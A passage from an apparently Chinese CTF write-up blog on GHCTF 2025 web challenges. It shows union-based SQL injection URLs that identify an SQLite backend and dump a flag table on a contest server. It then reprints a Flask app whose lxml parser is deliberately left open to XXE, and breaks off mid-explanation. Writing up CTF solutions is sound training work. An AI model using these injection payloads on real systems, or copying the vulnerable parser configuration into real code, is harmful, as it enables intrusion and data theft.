<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="generator" content="Hexo 7.3.0"><meta name="theme" content="hexo-theme-yun"><title>2025GHCTF新生赛(悄悄塞国际题) | Hexo</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"example.com","root":"/","title":["Sec203Team"],"version":"1.10.11","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml"><meta name="description" content="[GHCTF 2025]SQL???题目链接：https:&#x2F;&#x2F;www.nssctf.cn&#x2F;problem&#x2F;6575 题解(wp)首先打开题目发现是一个很明显的SQL注入（虽然题目已经给了）  这里可以看到出题人给的提示（每次执行的sql语句），可以看到并不需要闭合，直接跟上查询即可  尝试猜解字段  一共5列  很多人到这进一步之后就直接使用mysql语句直接注入（我也一样😶），在这之后就一直跟">
<meta property="og:type" content="article">
<meta property="og:title" content="2025GHCTF新生赛(悄悄塞国际题)">
<meta property="og:url" content="http://example.com/article/2025/03/2025GHCTF-wp.html/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="[GHCTF 2025]SQL???题目链接：https:&#x2F;&#x2F;www.nssctf.cn&#x2F;problem&#x2F;6575 题解(wp)首先打开题目发现是一个很明显的SQL注入（虽然题目已经给了）  这里可以看到出题人给的提示（每次执行的sql语句），可以看到并不需要闭合，直接跟上查询即可  尝试猜解字段  一共5列  很多人到这进一步之后就直接使用mysql语句直接注入（我也一样😶），在这之后就一直跟">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/image-1741779758394-1.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741578068744-58d43714-73ff-46ac-b1a1-23a824faa8c6.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741578324747-ad4d7c11-029c-4953-b5c4-152a9a8f7238.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741578434581-cb4a0aa5-6a49-42bb-a379-6ba92165676c.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741586509126-34dfe6cf-c494-40cf-9752-226c7b0c05b1.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741586610138-4b83d176-ae74-44a3-9966-92059725410f.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741587015088-79d885dd-90b2-429d-b323-72b3d7839c41.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741587325602-32b5b38d-cd11-4003-8760-ed88515981df.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741587514129-5919571f-b00f-4527-9055-2497d4e10be3.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741593612324-6d211200-2105-4c0a-a452-0b5d78c34e7e.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741594739679-a184e752-6193-4937-8d0f-b06d0bb3ee6c.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741594938128-f1d8005c-aa70-4e20-a0ad-4e9b7d1491d1.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741594986679-5a81e84d-4c14-480b-a567-240b7e44a1cb.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741595246431-d21b9db9-b0cc-428e-b902-59ea588ae127.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741595269700-75fd21a0-1f53-40fb-94fa-e8ba8632ec99.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741595417742-6d21483b-044d-437a-bbf0-6c6d8ca641a7.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741595430137-b14a9e42-394d-4131-ab78-32de2023d71b.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741596107226-488edb76-afd1-46d8-8366-43bf5ae412a2.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741596131525-61d9314a-cb11-41d1-95dd-fa2a74701273.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741596603705-69f2f4b9-cf95-4184-8f5f-b5dd2d351fb6.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741596646329-3e9e4b9f-f486-4ef3-a975-c0e9b903b696.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741603959131-15504d0f-710d-4cdb-9a4a-f7456950bda4.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741604022435-480e1814-42c5-4f78-b33a-653ef74fc1b3.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741605001752-56e85db7-14ec-4630-898d-58684a110edd.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741605028946-a85e4977-3b8c-4ba8-9643-326538f0206f.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741610144938-0392732d-640c-46c4-82ae-faa92ef1606e.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741761056352-81310bcb-a890-4f4a-940c-a141425541a6.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741769819330-d1c32618-88ed-4166-8867-5241558bb9d7.jpeg">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742031281304-2487266d-0f2b-4338-ae73-f4e4a808f0fa.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742031305284-a6979849-3d9e-4527-9819-96775689e1f3.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742031448186-1a669cac-ae88-40ac-a827-ad32cc1ed2e6.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742031483342-cd42b4ab-acdb-4345-a057-9801056265e0.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742031823033-c13c1bc4-6f2d-47eb-987a-7686d5fdf237.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741762974733-00c8656f-211f-4f06-b422-88175970fc47.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741763706926-5a0492d4-930b-49b8-a737-89c8c70110bd.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/image-20250316161453834.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/image-20250316161808503.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/image-20250316162139913.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/image-20250316162209165.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742110248326-9029419c-b8df-4dcf-b73c-d4e59cc6897b.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742110292105-889ffac7-3f93-451c-8da9-aedc7d20faa9.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742110415741-d0664a5d-c56f-4588-a008-656b40c253f0.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742110458398-dde4091b-f7a1-4922-8ada-d188362e9f59.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742110533854-eb00a2e2-7b37-4e26-b311-3c8f6c535939.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742110684450-de6eb184-da12-4bd8-823b-30e4b3192f47.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742111741730-fafc41ac-9272-443a-9203-9f2f17a202e4.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742111901549-6bbd1783-e9c8-42e1-8f45-ccddc2985221.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742111988479-affd37b8-8c6e-4f71-839f-88123bdc9cb0.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742112064301-cd58df66-eda2-4bd0-97c5-18c715ab6aca.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742522958050-224f8bd1-5f7b-475b-a022-3ed96e72432a.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742523019194-a1946d0b-5721-4313-b9ec-ca309bcaa15d.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742541181145-48f5cb2a-8cbb-4b19-93d9-9414db0415fb.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742541250329-3feb7b36-2972-41d3-a79a-6be769e089ac.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742541278009-4d0f89ba-7d63-4468-9193-3f8e4438336e.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742526871287-3b615f13-a594-4150-8208-72e77b2480fa.png">
<meta property="article:published_time" content="2025-03-12T11:00:00.000Z">
<meta property="article:modified_time" content="2025-03-20T09:14:53.421Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="web">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/image-1741779758394-1.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="John Doe"><img width="96" loading="lazy" src="/images/a8c5d524d3ada684930a703b4725d87e.png" alt="John Doe"><span class="site-author-status" title="不想上学">💨</span></a><div class="site-author-name"><a href="/about/">John Doe</a></div><span class="site-name">Hexo</span><sub class="site-subtitle"></sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">5</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">1</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">4</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#GHCTF-2025-SQL"><span class="toc-number">1.</span> <span class="toc-text">[GHCTF 2025]SQL???</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">题目链接：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3-wp"><span class="toc-number">1.2.</span> <span class="toc-text">题解(wp)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GHCTF-2025-%EF%B9%8F"><span class="toc-number">2.</span> <span class="toc-text">[GHCTF 2025] (&gt;﹏&lt;)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5"><span class="toc-number">2.1.</span> <span class="toc-text">题目链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3-wp-1"><span class="toc-number">2.2.</span> <span class="toc-text">题解(wp)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GHCTF-2025-UPUPUP"><span class="toc-number">3.</span> <span class="toc-text">[GHCTF 2025]UPUPUP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5-1"><span class="toc-number">3.1.</span> <span class="toc-text">题目链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3-wp-2"><span class="toc-number">3.2.</span> <span class="toc-text">题解(wp)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GHCTF-2025-Goph3rrr"><span class="toc-number">4.</span> <span class="toc-text">[GHCTF 2025]Goph3rrr</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5-2"><span class="toc-number">4.1.</span> <span class="toc-text">题目链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%88wp%EF%BC%89"><span class="toc-number">4.2.</span> <span class="toc-text">题解（wp）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">4.2.1.</span> <span class="toc-text">分析漏洞点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%EF%BC%9A"><span class="toc-number">4.2.1.1.</span> <span class="toc-text">第一种：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%EF%BC%9A"><span class="toc-number">4.2.1.2.</span> <span class="toc-text">第二种：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GHCTF-2025-Popppppp"><span class="toc-number">5.</span> <span class="toc-text">[GHCTF 2025]Popppppp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5-3"><span class="toc-number">5.1.</span> <span class="toc-text">题目链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%88wp%EF%BC%89-1"><span class="toc-number">5.2.</span> <span class="toc-text">题解（wp）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E9%87%8DMD5"><span class="toc-number">5.2.1.</span> <span class="toc-text">双重MD5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E9%81%8D%E5%8E%86%E2%BD%82%E4%BB%B6%E2%BD%AC%E5%BD%95%E7%B1%BB"><span class="toc-number">5.2.2.</span> <span class="toc-text">反序列化之遍历⽂件⽬录类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E8%AF%BB%E5%8F%96%E2%BD%82%E4%BB%B6%E7%B1%BB"><span class="toc-number">5.2.3.</span> <span class="toc-text">反序列化之读取⽂件类</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GHCTF-2025-upload-SSTI"><span class="toc-number">6.</span> <span class="toc-text">[GHCTF 2025]upload?SSTI!</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5-4"><span class="toc-number">6.1.</span> <span class="toc-text">题目链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%88wp%EF%BC%89-2"><span class="toc-number">6.2.</span> <span class="toc-text">题解（wp）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GHCTF-2025-GetShell"><span class="toc-number">7.</span> <span class="toc-text">[GHCTF 2025]GetShell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5-5"><span class="toc-number">7.1.</span> <span class="toc-text">题目链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%88wp%EF%BC%89-3"><span class="toc-number">7.2.</span> <span class="toc-text">题解（wp）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#getshell"><span class="toc-number">7.2.1.</span> <span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Suid%E6%8F%90%E6%9D%83"><span class="toc-number">7.2.2.</span> <span class="toc-text">Suid提权</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GHCTF-2025-Escape%EF%BC%81"><span class="toc-number">8.</span> <span class="toc-text">[GHCTF 2025]Escape！</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5-6"><span class="toc-number">8.1.</span> <span class="toc-text">题目链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%88wp%EF%BC%89-4"><span class="toc-number">8.2.</span> <span class="toc-text">题解（wp）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="toc-number">8.2.1.</span> <span class="toc-text">字符串逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">8.2.1.1.</span> <span class="toc-text">字符逃逸的原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-number">8.2.1.2.</span> <span class="toc-text">例子</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="toc-number">8.2.2.</span> <span class="toc-text">预期解</span></a></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://example.com/article/2025/03/2025GHCTF-wp.html/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="John Doe"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Hexo"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">2025GHCTF新生赛(悄悄塞国际题)</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2025-03-12 19:00:00" itemprop="dateCreated datePublished" datetime="2025-03-12T19:00:00+08:00">2025-03-12</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2025-03-20 17:14:53" itemprop="dateModified" datetime="2025-03-20T17:14:53+08:00">2025-03-20</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Sec203Team/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Sec203Team</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/web/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">web</span></a><a class="tag-item" href="/tags/CTF/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">CTF</span></a></span></div><div class="post-author"><span class="author-name">ZeroTrace</span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h1 id="GHCTF-2025-SQL"><a href="#GHCTF-2025-SQL" class="headerlink" title="[GHCTF 2025]SQL???"></a>[GHCTF 2025]SQL???</h1><h2 id="题目链接："><a href="#题目链接：" class="headerlink" title="题目链接："></a>题目链接：</h2><p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/6575">https://www.nssctf.cn/problem/6575</a></p>
<h2 id="题解-wp"><a href="#题解-wp" class="headerlink" title="题解(wp)"></a>题解(wp)</h2><p>首先打开题目发现是一个很明显的SQL注入（虽然题目已经给了）</p>
<p><img src="image-1741779758394-1.png" loading="lazy"></p>
<p>这里可以看到出题人给的提示（每次执行的sql语句），可以看到并不需要闭合，直接跟上查询即可</p>
<p><img src="1741578068744-58d43714-73ff-46ac-b1a1-23a824faa8c6.png" loading="lazy"></p>
<p>尝试猜解字段</p>
<p><img src="1741578324747-ad4d7c11-029c-4953-b5c4-152a9a8f7238.png" loading="lazy"></p>
<p>一共5列</p>
<p><img src="1741578434581-cb4a0aa5-6a49-42bb-a379-6ba92165676c.png" loading="lazy"></p>
<p>很多人到这进一步之后就直接使用mysql语句直接注入（我也一样😶），在这之后就一直跟这个sql语句过不去了，一直怀疑是题目过滤了一大堆东西</p>
<p>然后突然间想到23年的国赛题目，也是SQL注入</p>
<p><a target="_blank" rel="noopener" href="https://blog.mo60.cn/index.php/archives/2023-China-Skills-Security-Answer.html">https://blog.mo60.cn/index.php/archives/2023-China-Skills-Security-Answer.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.mo60.cn/index.php/archives/2023-China-Skills-Security-Answer.html#">题目+答案+2023年全国职业院校技能大赛信息安全管理与评估真题 - JunBlog</a></p>
<p>想到可能是数据库的不同</p>
<p>转换思想，尝试用每个sql数据库的不同sql语句尝试</p>
<p>查看回显位</p>
<pre><code class="language-sql">http://node1.anna.nssctf.cn:28691/?id=1 union select 1,2,3,4,5
</code></pre>
<p><img src="1741586509126-34dfe6cf-c494-40cf-9752-226c7b0c05b1.png" loading="lazy"></p>
<p>果不其然，通过sqlite_version()函数确认了数据库</p>
<pre><code class="language-sql">http://node1.anna.nssctf.cn:28691/?id=1 union select 1,sqlite_version(),3,4,5
</code></pre>
<p><img src="1741586610138-4b83d176-ae74-44a3-9966-92059725410f.png" loading="lazy"></p>
<p>这里推荐一篇讲sqlite注入的文章</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/8220?time__1311=YqUxg7DQi=30HRx+hDArUtGOY8Dt88T4D&u_atoken=eb5b96e94d51cbebed2d598991a308cc&u_asig=0a472f9017415793738783147e00df">https://xz.aliyun.com/news/8220?time__1311&#x3D;YqUxg7DQi%3D30HRx%2BhDArUtGOY8Dt88T4D&amp;u_atoken&#x3D;eb5b96e94d51cbebed2d598991a308cc&amp;u_asig&#x3D;0a472f9017415793738783147e00df</a></p>
<p>使用<strong>sql from sqlite_master</strong>查看表名</p>
<pre><code class="language-sql">http://node1.anna.nssctf.cn:28691/?id=1 union select 1,sqlite_version(),3,4,sql from sqlite_master
</code></pre>
<p><img src="1741587015088-79d885dd-90b2-429d-b323-72b3d7839c41.png" loading="lazy"></p>
<p>可以看到存在flag表</p>
<p>那就直接查看flag</p>
<pre><code class="language-sql">http://node1.anna.nssctf.cn:28691/?id=1 union select 1,2,3,4,group_concat(flag) from flag
</code></pre>
<p><img src="1741587325602-32b5b38d-cd11-4003-8760-ed88515981df.png" loading="lazy"></p>
<h1 id="GHCTF-2025-﹏"><a href="#GHCTF-2025-﹏" class="headerlink" title="[GHCTF 2025] (&gt;﹏&lt;)"></a>[GHCTF 2025] (&gt;﹏&lt;)</h1><h2 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h2><p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/6578">https://www.nssctf.cn/problem/6578</a></p>
<h2 id="题解-wp-1"><a href="#题解-wp-1" class="headerlink" title="题解(wp)"></a>题解(wp)</h2><p>打开题目发现返回了源码（缩进呢！！！🖕🖕🖕🖕）</p>
<p><img src="1741587514129-5919571f-b00f-4527-9055-2497d4e10be3.png" loading="lazy"></p>
<p>尝试恢复缩进</p>
<pre><code class="language-python">from flask import Flask, request
import base64
from lxml import etree
import re

app = Flask(__name__)

@app.route(&#39;/&#39;)
def index():
    return open(__file__).read()

@app.route(&#39;/ghctf&#39;, methods=[&#39;POST&#39;])
def parse():
    xml = request.form.get(&#39;xml&#39;)
    print(xml)
    if xml is None:
        return &quot;No System is Safe.&quot;
    parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
    root = etree.fromstring(xml, parser)
    name = root.find(&#39;name&#39;).text
    return name or None

if __name__ == &quot;__main__&quot;:
    app.run(host=&#39;0.0.0.0&#39;, port=8080)
</code></pre>
<p>在代码中导入了Flask、request、base64、lxml.etree和re模块。然后创建了一个Flask应用实例</p>
<pre><code class="language-python">app = Flask(__name__)
</code></pre>
<p>定义了两个路由：根路径’&#x2F;‘和’&#x2F;ghctf’的POST请求处理函数。</p>
<pre><code class="language-python">@app.route(&#39;/&#39;)
</code></pre>
<pre><code class="language-python">@app.route(&#39;/ghctf&#39;, methods=[&#39;POST&#39;])
</code></pre>
<p>接下来看到处理’&#x2F;ghctf’的POST的函数<strong>parse()</strong></p>
<pre><code class="language-python">@app.route(&#39;/ghctf&#39;, methods=[&#39;POST&#39;])
def parse():
    xml = request.form.get(&#39;xml&#39;)
    print(xml)
    if xml is None:
        return &quot;No System is Safe.&quot;
</code></pre>
<p>它从请求表单中获取名为’xml’的参数，然后打印出来。如果没有提供xml参数，就返回”No System is Safe.”</p>
<p>接着使用etree.XMLParser配置解析器，允许加载DTD并解析实体。然后尝试解析传入的xml字符串，并提取<name>标签的文本内容返回。</name></p>
